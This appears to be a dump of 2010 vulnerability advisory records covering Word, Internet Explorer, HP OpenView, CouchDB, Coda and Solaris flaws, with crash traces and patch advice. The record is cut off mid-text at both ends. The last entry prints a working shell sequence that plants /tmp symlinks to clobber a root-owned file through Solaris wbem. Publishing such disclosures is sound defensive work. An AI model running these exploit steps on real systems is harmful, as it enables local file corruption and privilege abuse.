DETAILS
Disassembly:
69081240 74 46 JE SHORT IML32.69081288
69081242 8B16 MOV EDX,DWORD PTR DS:[ESI]
69081244 8B46 08 MOV EAX,DWORD PTR DS:[ESI+8]
69081247 83E2 02 AND EDX,2
6908124A 0BD5 OR EDX,EBP
6908124C 83CA 01 OR EDX,1
6908124F 8916 MOV DWORD PTR DS:[ESI],EDX
69081251 8B56 04 MOV EDX,DWORD PTR DS:[ESI+4]
69081254 8950 04 MOV DWORD PTR DS:[EAX+4],EDX
69081257 8B46 04 MOV EAX,DWORD PTR DS:[ESI+4]
6908125A 8B56 08 MOV EDX,DWORD PTR DS:[ESI+8]
6908125D 8950 08 MOV DWORD PTR DS:[EAX+8],EDX
69081260 8BFE MOV EDI,ESI
69081262 03F5 ADD ESI,EBP
69081264 894C31 FC MOV DWORD PTR DS:[ECX+ESI-4],ECX <--- Problem
ECX = 0x616CF240
ESI = 0x06C94038
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14573,CVE-2010-2234: Apache CouchDB Cross Site Request Forgery Attack,,CVE-2010-2234,"CVE-2010-2234: Apache CouchDB Cross Site Request Forgery Attack
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache CouchDB 0.8.0 to 0.11.0
Description:
Apache CouchDB versions prior to version 0.11.1 are vulnerable to
cross site request forgery (CSRF) attacks.
Mitigation:
All users should upgrade to CouchDB 0.11.2 or 1.0.1. Upgrades from
the 0.11.x and 0.10.x series should be seamless. Users on earlier
versions should consult
http://wiki.apache.org/couchdb/Breaking_changes
Example:
A malicious website can POST arbitrary JavaScript code to well
known CouchDB installation URLs (like http://localhost:5984/)
and make the browser execute the injected JavaScript in the
security context of CouchDB's admin interface Futon.
Unrelated, but in addition the JSONP API has been turned off
by default to avoid potential information leakage.
Credit:
This CSRF issue was discovered by a source that wishes to stay
anonymous.
References:
http://couchdb.apache.org/downloads.html
http://wiki.apache.org/couchdb/Breaking_changes
http://en.wikipedia.org/wiki/Cross-site_request_forgery
Jan Lehnardt
--"
14574,CVE-2010-3014: Coda Filesystem Kernel Memory Disclosure,,CVE-2010-3014,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
VSR Security Advisory
http://www.vsecurity.com/
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Advisory Name: Coda Filesystem Kernel Memory Disclosure
Release Date: 2010-08-16
Application: Coda kernel module for NetBSD and FreeBSD
Versions: All known versions
Severity: Medium
Author: Dan Rosenberg < drosenberg (at) vsecurity (dot) com >
Vendor Status: Patch Released [2][3]
CVE Candidate: CVE-2010-3014
Reference: http://www.vsecurity.com/resources/advisory/20100816-1/
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Product Description
- -------------------
- From [1]:
""Coda is a distributed filesystem with its origin in AFS2. It has many
features that are very desirable for network filesystems. Currently, Coda has
several features not found elsewhere.
1. disconnected operation for mobile computing
2. is freely available under a liberal license
3. high performance through client side persistent caching
4. server replication
5. security model for authentication, encryption and access control
6. continued operation during partial network failures in server network
7. network bandwidth adaptation
8. good scalability
9. well defined semantics of sharing, even in the presence of nework failure""
Vulnerability Overview
- ----------------------
On July 19th, VSR identified a vulnerability in the Coda filesystem kernel
module, as implemented for FreeBSD and NetBSD. By sending a specially crafted
ioctl request to a mounted Coda filesystem, an unprivileged local user could
read large portions of kernel heap memory, leading to the disclosure of
potentially sensitive information.
Product Background
- ------------------
Coda is implemented as a kernel filesystem module with userland components.
System calls involving file I/O are passed to the Coda kernel module, which in
turn passes the request to the userland Venus cache manager via a character
device. Venus answers the request by checking its cache or requesting content
from the Coda server. Coda implements most standard filesystem operations,
including providing an ioctl interface.
Vulnerability Details
- ---------------------
Coda ioctls are passed through the Coda filesystem module before being sent to
Venus. The arguments to a Coda ioctl are encapsulated in a PioctlData struct,
which in turn contains a ViceIoctl struct. The ViceIoctl struct contains
""in_size"" and ""out_size"" fields, dictating the expected size of the input and
output data corresponding to a particular ioctl request. The ""in_size"" field
is validated to prevent memory corruption via copying an unexpected amount of
data from userspace into a kernel buffer.
However, the ""out_size"" field was missing this validation. When copying the
output data of an ioctl request back to userspace, the ""out_size"" field was
used to determine the amount of data to copy, without restricting it to a
maximum possible size. By specifying a large value for this field, the
contents of the kernel heap beyond the data intended to be returned to the user
would be copied into a userland buffer. An unprivileged user could exploit
this to read large portions of the kernel heap, potentially disclosing
sensitive information.
Versions Affected
- -----------------
This vulnerability affects all known versions of the Coda filesystem module as
included in FreeBSD and NetBSD. The Linux Coda module is not affected.
Vendor Response
- ---------------
The following timeline details FreeBSD's and NetBSD's response to the reported
issue:
2010-07-19 Vulnerability reported to FreeBSD and NetBSD
2010-07-20 Fix committed by NetBSD [2]
2010-07-21 Response from FreeBSD
2010-07-21 FreeBSD and NetBSD provided a draft advisory
2010-08-05 Fix committed by FreeBSD [3]
2010-08-16 Coordinated disclosure
Recommendation
- --------------
Coda users should apply the updates committed by NetBSD [2] and FreeBSD[3].
Common Vulnerabilities and Exposures (CVE) Information
- ------------------------------------------------------
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2010-3014 to this issue. This is a candidates for
inclusion in the CVE list (http://cve.mitre.org), which standardizes
names for security problems.
Acknowledgements
- ----------------
Thanks to the FreeBSD and NetBSD security teams for their prompt responses.
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
References:
1. Coda File System
http://www.coda.cs.cmu.edu
2. Coda module in NetBSD CVS
http://cvsweb.netbsd.org/bsdweb.cgi/src/sys/coda/?only_with_tag=MAIN
3. FreeBSD SVN revision 210997
http://svn.freebsd.org/viewvc/base?view=revision&revision=210997
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
This advisory is distributed for educational purposes only with the sincere
hope that it will help promote public safety. This advisory comes with
absolutely NO WARRANTY; not even the implied warranty of merchantability or
fitness for a particular purpose. Virtual Security Research, LLC nor the author
accepts any liability for any direct, indirect, or consequential loss or damage
arising from use of, or reliance on, this information.
See the VSR disclosure policy for more information on our responsible
disclosure practices: http://www.vsecurity.com/company/disclosure
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Copyright 2010 Virtual Security Research, LLC. All rights reserved.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iEYEARECAAYFAkxpiYQACgkQQ1RSUNR+T+hfGwCfaRQXT13u2A/Yi+gEA4nYmKJY
E54An3z9sEKrVhVmXOxG4f0+b4dApu7e
=RjUw
-----END PGP SIGNATURE-----"
14630,Microsoft Office Word HTML Linked Objects Memory Corruption Vulnerability - CVE-2010-1903,,CVE-2010-1903,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Microsoft Office Word HTML Linked Objects Memory Corruption Vulnerability
CVE-2010-1903 - MS10-056
INTRODUCTION
There exists a vulnerability within the way Word handles html linked objects, which leads
to attacker controlled memory write and code execution.
There is a poc.doc file that demonstrates the vulnerability and is available to interested
parts.
This problem was confirmed in the following versions of Word and Windows, other versions
may be also affected.
Microsoft Office XP Service Pack 3 and older
Microsoft Office 2003 Service Pack 3 and older
2007 Microsoft Office System Service Pack 2 and older
Microsoft Office 2004 for Mac
Microsoft Office 2008 for Mac
Open XML file format converter for Mac
Microsoft Office Word Viewer
Microsoft Office Compatibility Pack for Word, Excel, and PowerPoint 2007 File Formats Service Pack 2
Microsoft Works 9
CVSS Scoring System
The CVSS score is: 8.6
Base Score: 10
Temporal Score: 8.6
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:UR

TRIGGERING THE PROBLEM
The problem is triggered by a PoC available only to interested parts which causes invalid memory write in
all the referred versions.
DETAILS
Opening the attached poc.doc file and breaking in the following call, we see:
eax=00126c5c ebx=00126c40 ecx=00000000 edx=00000001 esi=00944001 edi=00000000
eip=3179fd74 esp=00126b9c ebp=00126bc0 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
wwlib!DllGetClassObject+0x7fe9e:
3179fd74 e87bf9ffff call wwlib!DllGetClassObject+0x7f81e (3179f6f4)
Disassembling the code:
0:000> u
wwlib!DllGetClassObject+0x7fe9e:
3179fd74 e87bf9ffff call wwlib!DllGetClassObject+0x7f81e (3179f6f4)
3179fd79 3bf7 cmp esi,edi
3179fd7b 8b4310 mov eax,dword ptr [ebx+10h]
3179fd7e 894508 mov dword ptr [ebp+8],eax
3179fd81 7404 je wwlib!DllGetClassObject+0x7feb1 (3179fd87)
3179fd83 66893c46 mov word ptr [esi+eax*2],di
3179fd87 397b2c cmp dword ptr [ebx+2Ch],edi
3179fd8a 740e je wwlib!DllGetClassObject+0x7fec4 (3179fd9a)
The faulting instruction is at address 3179fd83, where di and eax are NULL and esi a
fixed value. The value eax is copied from the stack. The same with the di register.
Stepping into the first called function:
0:000> u 3179f6f4
wwlib!DllGetClassObject+0x7f81e:
3179f6f4 55 push ebp
3179f6f5 8bec mov ebp,esp
3179f6f7 81ecb8010000 sub esp,offset <Unloaded_dui.DLL>+0x187 (000001b8)
3179f6fd a170474831 mov eax,dword ptr [wwlib+0x244770 (31484770)]
3179f702 33c5 xor eax,ebp
3179f704 8945fc mov dword ptr [ebp-4],eax
3179f707 838db0feffffff or dword ptr [ebp-150h],0FFFFFFFFh
3179f70e 33c9 xor ecx,ecx
The stack trace information:
0:000> k
ChildEBP RetAddr
WARNING: Stack unwind information not available. Following frames may be wrong.
00126bc0 315d18cb wwlib!DllGetClassObject+0x7fe9e
00126d8c 315d02f7 wwlib!FMain+0x133a26
00126e18 315cf42f wwlib!FMain+0x132452
00127430 315cefc0 wwlib!FMain+0x13158a
0012763c 315ce9ba wwlib!FMain+0x13111b
001276d4 6bdd1d83 wwlib!FMain+0x130b15
00127784 6bdd24c8 MSPTLS!LssbFIsSublineEmpty+0x22cb
00127804 6bddf8e0 MSPTLS!LssbFIsSublineEmpty+0x2a10
00127868 6bddff5d MSPTLS!LssbFIsSublineEmpty+0xfe28
00127898 6bddf1ef MSPTLS!LssbFIsSublineEmpty+0x104a5
00127a9c 6bdc4b85 MSPTLS!LssbFIsSublineEmpty+0xf737
00127ad0 318e1917 MSPTLS!LsCreateLine+0x23
00127b44 3181c5f8 wwlib!DllGetClassObject+0x1c1a41
00127bac 31549412 wwlib!DllGetClassObject+0xfc722
00127c9c 6be51b06 wwlib!FMain+0xab56d
00127d3c 6be5c63a MSPTLS!FsDestroyMemory+0x1ee39
00127eb4 6be5c92b MSPTLS!FsDestroyMemory+0x2996d
00127f00 6be36d4d MSPTLS!FsDestroyMemory+0x29c5e
00127f6c 6be37f7b MSPTLS!FsDestroyMemory+0x4080
00128078 6be4e8ca MSPTLS!FsDestroyMemory+0x52ae
!exploitable output:
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at wwlib!DllGetClassObject+0x000000000007fead (Hash=0x43317a27.0x44020844)
User mode write access violations that are not near NULL are exploitable.
This vulnerability can be remotely triggered if an user choose to open a .doc while using IE or any other browser (in
IE it will spawn a winword.exe process inside the browser, but the process remains as a new one).
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from
Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14631,VUPEN Security Research - Microsoft Internet Explorer Table Element Use-after-free Vulnerability (CVE-2010-2560),,CVE-2010-2560,"VUPEN Security Research - Microsoft Internet Explorer Table Element Use-after-free Vulnerability (CVE-2010-2560)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and included
as part of the Microsoft Windows line of operating systems with more than 60% of
the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error when processing
table elements, which could be exploited by remote attackers to execute
arbitrary code by tricking a user into visiting a specially crafted
web page.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 8
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
On Windows 7, Windows 2008, Windows 2003, Windows Vista, and Windows XP
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-053 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2050
http://www.microsoft.com/technet/security/bulletin/ms10-053.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2560
X. DISCLOSURE TIMELINE
-----------------------------
2010-05-05 - Vendor and TPP customers notified
2010-05-05 - Vendor response
2010-08-06 - Status update received
2010-08-10 - Coordinated public Disclosure"
14632,"VUPEN Security Research - Microsoft Internet Explorer ""CIframeElement"" Object Use-after-free Vulnerability (CVE-2010-2558)",,CVE-2010-2558,"VUPEN Security Research - Microsoft Internet Explorer ""CIframeElement"" Object Use-after-free Vulnerability (CVE-2010-2558)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and included
as part of the Microsoft Windows line of operating systems with more than 60% of
the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error when processing
""CIframeElement"" objects, which could be exploited by remote attackers to
execute arbitrary code by tricking a user into visiting a specially crafted
web page.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 8
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
On Windows 7, Windows 2008, Windows 2003, Windows Vista, and Windows XP
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-053 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2050
http://www.microsoft.com/technet/security/bulletin/ms10-053.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2558
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-13 - Vendor and TPP customers notified
2010-04-13 - Vendor response
2010-08-06 - Status update received
2010-08-10 - Coordinated public Disclosure"
14633,"VUPEN Security Research - Microsoft Internet Explorer ""boundElements"" Property Use-after-free Vulnerability (CVE-2010-2557)",,CVE-2010-2557,"VUPEN Security Research - Microsoft Internet Explorer ""boundElements"" Property Use-after-free Vulnerability (CVE-2010-2557)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and included
as part of the Microsoft Windows line of operating systems with more than 60% of
the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error when processing
the ""boundElements"" property, which could be exploited by remote attackers to
execute arbitrary code by tricking a user into visiting a specially crafted
web page.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 6
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-053 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2050
http://www.microsoft.com/technet/security/bulletin/ms10-053.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2557
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-13 - Vendor and TPP customers notified
2010-04-13 - Vendor response
2010-08-06 - Status update received
2010-08-10 - Coordinated public Disclosure"
14634,"VUPEN Security Research - Microsoft Internet Explorer ""OnPropertyChange_Src()"" Use-after-free Vulnerability (CVE-2010-2556)",,CVE-2010-2556,"VUPEN Security Research - Microsoft Internet Explorer ""OnPropertyChange_Src()"" Use-after-free Vulnerability (CVE-2010-2556)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and included
as part of the Microsoft Windows line of operating systems with more than 60% of
the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error within the
""OnPropertyChange_Src()"" function when handling malformed HTML/JS data,
which could be exploited by remote attackers to execute arbitrary code
by tricking a user into visiting a specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 8.x
Microsoft Internet Explorer 7.x
Microsoft Internet Explorer 6.x
On Windows 7, Windows 2008, Windows Vista, Windows 2003 and Windows XP.
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-053 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2050
http://www.microsoft.com/technet/security/bulletin/ms10-053.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2556
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-13 - Vendor and TPP customers notified
2010-04-13 - Vendor response
2010-08-06 - Status update received
2010-08-10 - Coordinated public Disclosure"
14799,"VUPEN Security Research - HP OpenView Network Node Manager ""ov.dll"" Buffer Overflow Vulnerability (CVE-2010-2704)",,CVE-2010-2704,"VUPEN Security Research - HP OpenView Network Node Manager ""ov.dll"" Buffer Overflow Vulnerability (CVE-2010-2704)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""HP OpenView Network Node Manager is the market-leading network management
solution that enables problem detection for the entire environment utilizing
a wide range of statistics, alarms, maps, graphs and charts on a single
display."" from hp.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability in
HP OpenView Network Node Manager (OV NNM).
This vulnerability is caused by a buffer overflow error in the ""ov.dll""
library when processing certain arguments supplied via CGI executables,
which could be exploited by remote unauthenticated attackers to execute
arbitrary code.
III. AFFECTED PRODUCTS
---------------------------
HP OpenView Network Node Manager version 7.51 (HP-UX, Linux, Solaris, Windows)
HP OpenView Network Node Manager version 7.53 (HP-UX, Linux, Solaris, Windows)
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply patches:
http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02290344
VII. CREDIT
--------------
This vulnerability was discovered by Sebastien Renaud of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1866
http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02290344
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2704
X. DISCLOSURE TIMELINE
-----------------------------
2010-06-16 - Vendor and TPP customers notified
2010-06-16 - Vendor response
2010-07-02 - Status update received
2010-07-21 - Coordinated public Disclosure"
14800,"VUPEN Security Research - HP OpenView Network Node Manager ""nnmrptconfig.exe"" Buffer Overflow (CVE-2010-2703)",,CVE-2010-2703,"VUPEN Security Research - HP OpenView Network Node Manager ""nnmrptconfig.exe"" Buffer Overflow (CVE-2010-2703)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""HP OpenView Network Node Manager is the market-leading network management
solution that enables problem detection for the entire environment utilizing
a wide range of statistics, alarms, maps, graphs and charts on a single
display."" from hp.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability in
HP OpenView Network Node Manager (OV NNM).
This vulnerability is caused by a buffer overflow error in the ""nnmrptconfig.exe""
CGI when processing an overly long parameter value, which could be exploited
by remote unauthenticated attackers to execute arbitrary code.
III. AFFECTED PRODUCTS
---------------------------
HP OpenView Network Node Manager (OV NNM) version 7.51 (Windows)
HP OpenView Network Node Manager (OV NNM) version 7.53 (Windows)
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
HP OV NNM v7.53 (Windows) - Apply NNM_01203 and hotfix SSRT100025
HP OV NNM v7.51 - Upgrade to NNM v7.53 and apply NNM_01203 and hotfix
SSRT100025
VII. CREDIT
--------------
This vulnerability was discovered by Sebastien Renaud of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1866
http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02286088
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2703
X. DISCLOSURE TIMELINE
-----------------------------
2010-06-16 - Vendor and TPP customers notified
2010-06-16 - Vendor response
2010-07-02 - Status update received
2010-07-21 - Coordinated public Disclosure"
14821,CVE-2010-2384: Solaris wbem unsafe use of temporary files,,CVE-2010-2384,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Below is the full disclosure information for CVE-2010-2384. It was
reported to security-alert sun com on 3 January, 2010 and assigned Sun
bug 6913886.
This vulnerability was addressed by Sun/Oracle in the July 2010 Critical
Patch Update
(http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujul2010.html).
- ------
When the wbem service is enabled
but hasn't been used before, it will run
/usr/sadm/lib/smc/prereg/SUNWrmui/SUNWrmui_reg.sh which can be exploited
by an unprivileged local user like this:
$ id
uid=101(fstuart) gid=14(sysadmin)
$ cd /tmp
$ x=0
$ while [ ""$x"" -ne 30000 ] ;do
> ln -s /etc/important /tmp/dummy.$x
> x=$(expr ""$x"" + 1)
> done
$ ls -dl /etc/important
-rw-r--r-- 1 root root 38 Jan 3 22:43 /etc/important
$ cat /etc/important
This is an important file!
EOF
$ telnet localhost 898
Trying 127.0.0.1...
Connected to localhost.
